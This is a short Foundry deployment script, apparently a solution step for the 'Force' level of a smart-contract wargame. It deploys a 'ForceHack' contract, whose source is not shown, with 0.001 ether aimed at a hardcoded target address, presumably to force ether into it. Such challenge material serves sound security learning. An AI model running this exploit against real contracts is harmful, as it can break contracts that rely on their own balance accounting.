// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "forge-std/Script.sol";
import "../src/forceHack.sol";

contract forceScript is Script {
    ForceHack public contractInstance;
    address instanceOfforce = 0x6c038Ff73928585BD29cEaE69C83f7067842E81c;

    function setUp() public payable {}

    function run() public {
        vm.startBroadcast();
        contractInstance = (new ForceHack){value: 0.001 ether}();
        instanceOfforce.balance;

        vm.stopBroadcast();
    }
}
